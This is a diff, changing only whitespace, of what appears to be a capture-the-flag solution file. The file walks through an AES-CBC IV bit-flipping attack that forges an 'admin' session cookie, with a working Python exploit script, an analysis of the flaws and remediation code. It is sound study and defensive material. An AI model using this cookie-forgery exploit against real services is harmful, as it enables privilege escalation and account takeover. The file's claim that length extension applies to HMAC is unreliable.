@@ -16,17 +16,17 @@ tricks:
       # Login with test1:test1
       POST /login
       username=test1&password=test1
-      
+
       # Receive session cookie (hex-encoded)
       # Example: 6c0fc6eabe178d94...4febdb98746754d8... (64 hex chars = 32 bytes)
-      
+
       # Cookie structure:
       # - First 16 bytes (32 hex chars): IV
       # - Next 16 bytes (32 hex chars): Ciphertext
-      # 
+      #
       # Total: 32 bytes = 16-byte IV + 16-byte ciphertext
       # This suggests AES-CBC with single block encryption
-      
+
       # Key observations:
       # 1. Cookie length is fixed (32 bytes)
       # 2. No signature or MAC appended
@@ -39,24 +39,24 @@ tricks:
     payload: |
       # CBC Decryption Formula:
       # Plaintext = Decrypt(Ciphertext) XOR IV
-      # 
+      #
       # For the first block:
       # P[0] = D(C[0]) XOR IV
-      # 
+      #
       # Where:
       # - P[0] is plaintext block (the username)
       # - C[0] is ciphertext block
       # - D() is AES decryption function
       # - IV is initialization vector
-      # 
+      #
       # Key insight:
       # If we modify the IV, we can control the plaintext!
-      # 
+      #
       # To change plaintext from 'test1' to 'admin':
       # 1. Current: P_old = D(C[0]) XOR IV_old
       # 2. Desired: P_new = D(C[0]) XOR IV_new
       # 3. Therefore: IV_new = IV_old XOR P_old XOR P_new
-      # 
+      #
       # The intermediate value D(C[0]) remains constant,
       # so we only need to modify the IV!
 
@@ -66,29 +66,29 @@ tricks:
     payload: |
       # Original username: 'test1' (with null padding)
       # Target username:   'admin' (with null padding)
-      # 
+      #
       # XOR calculation for each byte:
       # Position 0: 't' (0x74) -> 'a' (0x61)
       #   XOR difference: 0x74 ^ 0x61 = 0x15
-      # 
+      #
       # Position 1: 'e' (0x65) -> 'd' (0x64)
       #   XOR difference: 0x65 ^ 0x64 = 0x01
-      # 
+      #
       # Position 2: 's' (0x73) -> 'm' (0x6d)
       #   XOR difference: 0x73 ^ 0x6d = 0x1e
-      # 
+      #
       # Position 3: 't' (0x74) -> 'i' (0x69)
       #   XOR difference: 0x74 ^ 0x69 = 0x1d
-      # 
+      #
       # Position 4: '1' (0x31) -> 'n' (0x6e)
       #   XOR difference: 0x31 ^ 0x6e = 0x5f
-      # 
+      #
       # Positions 5-15: null bytes remain null (no change)
-      
+
       # Python code to calculate:
       original = b'test1'
       target = b'admin'
-      
+
       for i in range(len(target)):
           xor_diff = original[i] ^ target[i]
           print(f"Byte {i}: {original[i]:02x} ^ {target[i]:02x} = {xor_diff:02x}")
@@ -98,33 +98,33 @@ tricks:
     how: "Apply XOR to IV bytes"
     payload: |
       import requests
-      
+
       # Step 1: Login and get cookie
       session = requests.Session()
       session.post('http://localhost:80/login',
                    data={'username': 'test1', 'password': 'test1'})
       cookie = session.cookies.get('session')
-      
+
       # Step 2: Parse cookie
       encrypted_data = bytes.fromhex(cookie)
       iv = bytearray(encrypted_data[:16])
       ciphertext = encrypted_data[16:]
-      
+
       # Step 3: Calculate new IV
       original_plaintext = b'test1'
       target_plaintext = b'admin'
-      
+
       for i in range(len(target_plaintext)):
           # Flip bits: new_iv[i] = old_iv[i] ^ old_pt[i] ^ new_pt[i]
           iv[i] ^= original_plaintext[i] ^ target_plaintext[i]
-      
+
       # Step 4: Construct modified cookie
       modified_cookie = (bytes(iv) + ciphertext).hex()
-      
+
       # Step 5: Use modified cookie
       response = requests.get('http://localhost:80/welcome',
                              cookies={'session': modified_cookie})
-      
+
       if 'FLAG{' in response.text:
           print("Success! Got flag:", response.text)
 
@@ -135,7 +135,7 @@ tricks:
       # Send GET request to /welcome with modified cookie
       GET /welcome
       Cookie: session=<modified_cookie_hex>
-      
+
       # Server process:
       # 1. Receives modified cookie
       # 2. Extracts IV and ciphertext
@@ -144,7 +144,7 @@ tricks:
       # 5. Strips null padding: username = 'admin'
       # 6. Checks: if username == 'admin':
       # 7. Returns flag!
-      
+
       # Expected response:
       # <h1>Welcome, Welcome admin! Here is your flag: FLAG{...}!</h1>
 
@@ -153,27 +153,27 @@ tricks:
     how: "Analyze security flaws"
     payload: |
       # Vulnerability factors:
-      
+
       # 1. No authentication/MAC
       # - Cookie has no HMAC or signature
       # - Server cannot detect tampering
       # - Attacker can modify IV freely
-      
+
       # 2. CBC mode properties
       # - IV modification directly affects plaintext
       # - Predictable bit flipping (XOR is reversible)
       # - First block is most vulnerable (IV-controlled)
-      
+
       # 3. Null-byte padding
       # - Simple padding scheme (not PKCS7)
       # - Padding doesn't provide integrity
       # - rstrip(b'\x00') easily removes it
-      
+
       # 4. Direct username comparison
       # - if username == 'admin': return flag
       # - No secondary authentication
       # - No rate limiting on failed attempts
-      
+
       # Security failures:
       # ❌ Encryption without authentication (Encrypt-only)
       # ❌ Trusting decrypted data without verification
@@ -189,14 +189,14 @@ tricks:
       # ✓ Change specific bytes predictably
       # ✓ Works when plaintext structure is known
       # ✓ Requires only IV modification (for first block)
-      
+
       # What bit flipping CANNOT do:
       # ✗ Decrypt unknown ciphertext
       # ✗ Recover the encryption key
       # ✗ Work without knowing original plaintext
       # ✗ Bypass MAC/HMAC authentication
       # ✗ Work with authenticated encryption (AES-GCM)
-      
+
       # Requirements for successful attack:
       # 1. Know the original plaintext (or part of it)
       # 2. Know the desired target plaintext
@@ -210,46 +210,46 @@ tricks:
     payload: |
       # Fix 1: Use authenticated encryption (BEST)
       from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-      
+
       aesgcm = AESGCM(key)
       nonce = os.urandom(12)
-      
+
       # Encrypt with authentication
       ciphertext = aesgcm.encrypt(nonce, plaintext, None)
-      
+
       # Decrypt with verification (throws exception if tampered)
       plaintext = aesgcm.decrypt(nonce, ciphertext, None)
-      
+
       # ✓ Provides confidentiality + integrity
       # ✓ Detects any tampering
       # ✓ Industry standard (TLS 1.3 uses AEAD)
-      
+
       # Fix 2: Encrypt-then-MAC (if CBC required)
       import hmac
       import hashlib
-      
+
       # Encrypt first
       iv = os.urandom(16)
       ciphertext = encrypt_cbc(plaintext, key, iv)
-      
+
       # Then compute MAC over IV + ciphertext
       mac = hmac.new(mac_key, iv + ciphertext, hashlib.sha256).digest()
-      
+
       # Store: iv + ciphertext + mac
       cookie = (iv + ciphertext + mac).hex()
-      
+
       # Verify MAC before decrypting
       received_mac = cookie_bytes[-32:]
       expected_mac = hmac.new(mac_key, cookie_bytes[:-32], hashlib.sha256).digest()
       if not hmac.compare_digest(received_mac, expected_mac):
           raise ValueError("MAC verification failed!")
-      
+
       # Fix 3: Use framework session management
       # Most web frameworks provide secure sessions
       # Flask example:
       from flask import session
       session['username'] = username  # Automatically signed
-      
+
       # ✓ Built-in signature verification
       # ✓ Prevents tampering
       # ✓ Battle-tested implementation
@@ -262,25 +262,23 @@ tricks:
       # - Exploits CBC padding validation
       # - Decrypts ciphertext without key
       # - Requires padding error oracle
-      
+
       # 2. Block Swapping
       # - Reorder CBC blocks
       # - Causes predictable plaintext changes
       # - Useful for structured data
-      
+
       # 3. IV Reuse Attack
       # - Same IV used for multiple messages
       # - Reveals XOR of plaintexts
       # - Common in poorly implemented CBC
-      
+
       # 4. Length Extension Attack
       # - Different algorithm (hash-based MACs)
       # - Extends authenticated message
       # - Applies to HMAC if used incorrectly
-      
+
       # 5. Replay Attacks
       # - Resend valid encrypted messages
       # - No freshness/nonce checking
       # - Bypasses encryption entirely
-
-
